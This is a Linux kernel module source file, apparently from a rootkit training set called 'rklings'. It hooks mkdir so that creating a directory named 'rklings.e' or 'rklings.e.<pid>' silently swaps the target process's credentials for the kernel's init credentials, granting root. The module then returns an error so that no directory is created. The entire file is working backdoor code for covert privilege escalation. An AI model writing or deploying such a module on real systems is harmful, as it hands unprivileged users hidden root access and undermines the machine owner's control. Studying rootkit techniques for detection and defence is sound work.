// SPDX-License-Identifier: GPL-2.0
#include "rklings_hook.h"
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/rcupdate.h>
#include <linux/sched/task.h>
#include <linux/string.h>

#define RK_CMD     "rklings.e"
#define RK_CMD_LEN 9

static int rk_escalate_pid(pid_t pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred, *old_real_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	get_task_struct(task);
	rcu_read_unlock();
	if (!task->mm) {
		put_task_struct(task);
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		put_task_struct(task);
		return -ENOMEM;
	}

	task_lock(task);
	old_cred = task->cred;
	old_real_cred = task->real_cred;
	get_cred(new_cred);
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	task_unlock(task);

	put_cred(old_cred);
	put_cred(old_real_cred);
	put_task_struct(task);
	return 0;
}

RK_ON_MKDIR(name)
{
	pid_t pid;
	int ret;

	if (strncmp(name, RK_CMD, RK_CMD_LEN) != 0)
		return 0;
	if (name[RK_CMD_LEN] == '\0')
		pid = task_ppid_nr(current);
	else if (name[RK_CMD_LEN] != '.' ||
		 kstrtoint(name + RK_CMD_LEN + 1, 10, &pid) != 0 || pid <= 0)
		return -EINVAL;

	ret = rk_escalate_pid(pid);
	if (ret)
		return ret;
	pr_info("rklings: escalated pid %d to root\n", pid);
	return -ENOENT;
}

static int __init rk_init(void) { return rk_hook_start(); }
static void __exit rk_exit(void) { rk_hook_stop(); }

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings immediate PID-targeted escalation");
